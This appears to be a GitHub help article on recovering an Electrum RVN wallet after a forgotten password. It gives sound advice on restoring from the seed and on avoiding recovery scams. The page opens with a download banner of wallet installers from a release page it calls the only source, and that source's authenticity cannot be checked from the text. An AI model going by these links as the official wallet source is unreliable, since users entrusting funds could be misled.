![Electrum RVN](assets/banner-article.png)

# Forgot Your Electrum RVN Password?

<!-- compact-download-block -->

<p align="center">Resetting nothing, and restoring instead</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Nobody can reset it. The password encrypts the wallet file on your machine, and there is no account, no server and no recovery email behind it. What you can do is restore the wallet from its twelve-word seed into a new file with a new password - and if the seed is gone too, the file is a locked box.

## What the password is, and is not

It is a key derived from what you typed, used to encrypt the wallet file on disk. It never leaves the machine, is never sent to a server, and is not stored anywhere in a recoverable form.

So there is no "forgot password" link, because there is no service to send one. That is the same property that means no one can freeze your funds: no custodian, no reset.

What the password is **not** is the seed. The seed restores the wallet; the password only opens this copy of it. Losing the password with the seed in hand costs you a restore, not a coin - [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md).

## The recovery path

1. **Find the seed.** The twelve words you wrote when the wallet was created. If they are on paper, get the paper.
2. **Create a new wallet by restoring.** Do not try to open the old file; create a restored wallet with a new name.
3. **Enter the twelve words.** Order matters, spelling matters.
4. **Set a new password.** This one is yours to choose, and it can differ from the old one.
5. **Let it rescan** and confirm the balance.
6. **Delete the old file** once the new wallet is verified, or keep it if you want to try recovering labels later.

Labels and local history do not come back from a seed - they lived in the encrypted file - [restore a wallet from an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md).

## If the balance is zero after restoring

Do not panic, and do not conclude the seed is wrong. A restored wallet showing zero is usually looking along a different derivation path. Switch to the alternate Ravencoin path, rescan, and the balance normally appears - [zero balance after restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md).

## If you have the file but not the seed

Then the password is the only remaining way in. Three things worth trying, in order of how likely they are to work:

**Recall rather than guess.** Passwords are usually remembered in patterns: a phrase plus a number, a variation on an old one, the same password with a different capitalisation. Writing down candidates and testing them calmly beats random attempts.

**Look for your own records.** A password you wrote in a notebook, a password manager entry you forgot existed, a note in an old email to yourself - these are legitimate places to look, unlike anything on the internet offering to "unlock" a wallet.

**Accept the limit.** If the password is gone and the seed is gone, the funds cannot be recovered by anyone, including the developers. That sentence is unpleasant and it is true - [Electrum RVN recovery without the seed](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-recovery-without-the-seed.md).

## What not to do

**Do not send the file to a "recovery service".** A service that asks for the wallet file and a fee has your encrypted keys and no incentive to return them.

**Do not paste the seed into a "password recovery" site.** It is the wallet, and the site now has it.

**Do not reinstall repeatedly.** Reinstalling does not touch the file, does not reset the password and does not help.

**Do not delete the old file** until you have a working restored wallet. A locked file is still the only copy of the labels and history, and it is the only path if the seed turns up later.

## Making sure this does not happen again

- Write the seed down and store it offline, in two places - [storing your Electrum RVN seed offline](https://github.com/electrum-source/passphrase-backup/blob/main/storing-your-electrum-rvn-seed-offline.md).
- Use a password you can reconstruct: a long phrase you will not forget, written nowhere near the seed.
- Test a restore once, while you still remember everything.
- If you use a password manager, store a *hint* there, not the seed.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. If a restore behaves unexpectedly, update before assuming the worst: [updating to the latest release](https://github.com/electrum-source/download-and-setup/blob/main/update-electrum-rvn-to-the-latest-release.md). [Where Electrum RVN stores your wallet](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) tells you which file you are trying to open, and [wallet file encryption in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/wallet-file-encryption-in-electrum-rvn.md) explains what the password is actually protecting.

## FAQ

### Can anyone reset my Electrum RVN password?

No. There is no account and no server holding your credentials. The password exists only as the key to your local file.

### Is there a master password or backdoor?

No. Anyone claiming otherwise is describing a different product, or a scam.

### Can I recover the wallet if I have the seed but not the password?

Yes. Restore from the seed into a new wallet file and set a new password. The balance returns; labels and history do not.

### Can I recover it if I have the password but not the seed?

You can use the wallet as long as the file survives - the password opens it. You cannot restore it elsewhere, which is why the seed is the backup.

### Should I keep the old encrypted file?

Yes, at least until a restored wallet is working. It is the only copy of your labels, and it is the only route back if the seed reappears.

<!-- related-articles -->

## Related articles

- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
- [Restore a Wallet From an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md)
- [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md)
- [Electrum RVN Recovery Without the Seed](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-recovery-without-the-seed.md)
